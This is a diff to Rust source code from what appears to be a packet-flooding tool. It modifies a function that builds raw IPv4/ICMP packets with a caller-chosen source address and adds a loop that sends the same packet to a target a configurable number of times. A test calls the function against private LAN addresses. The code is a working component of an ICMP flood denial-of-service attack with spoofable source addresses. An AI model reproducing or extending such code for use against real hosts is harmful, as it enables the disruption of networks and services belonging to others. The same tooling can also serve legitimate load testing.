@@ -16,7 +16,13 @@ use crate::flood::ICMP_HEADER_LEN;
 use crate::flood::IPV4_HEADER_LEN;
 use crate::utils;
 
-pub fn send_icmp_flood_packet(src_ipv4: Ipv4Addr, dst_ipv4: Ipv4Addr) -> Result<()> {
+pub fn send_icmp_flood_packet(
+    src_ipv4: Ipv4Addr,
+    _: u16, // unified interface
+    dst_ipv4: Ipv4Addr,
+    _: u16, // unified interface
+    max_same_packet: usize,
+) -> Result<()> {
     let icmp_protocol = Layer3(IpNextHeaderProtocols::Icmp);
     let (mut icmp_tx, _) = transport_channel(ICMP_BUFF_SIZE, icmp_protocol)?;
 
@@ -48,8 +54,10 @@ pub fn send_icmp_flood_packet(src_ipv4: Ipv4Addr, dst_ipv4: Ipv4Addr) -> Result<
     icmp_header.set_checksum(checksum);
 
     ip_header.set_payload(&icmp_header.packet());
-    match icmp_tx.send_to(ip_header, dst_ipv4.into()) {
-        _ => (),
+    for _ in 0..max_same_packet {
+        match icmp_tx.send_to(&ip_header, dst_ipv4.into()) {
+            _ => (),
+        }
     }
     Ok(())
 }
@@ -61,7 +69,7 @@ mod tests {
     fn test_icmp_flood_packet() {
         let src_ipv4 = Ipv4Addr::new(192, 168, 72, 130);
         let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 136);
-        let ret = send_icmp_flood_packet(src_ipv4, dst_ipv4).unwrap();
+        let ret = send_icmp_flood_packet(src_ipv4, 0, dst_ipv4, 0, 1).unwrap();
         println!("{:?}", ret);
     }
 }
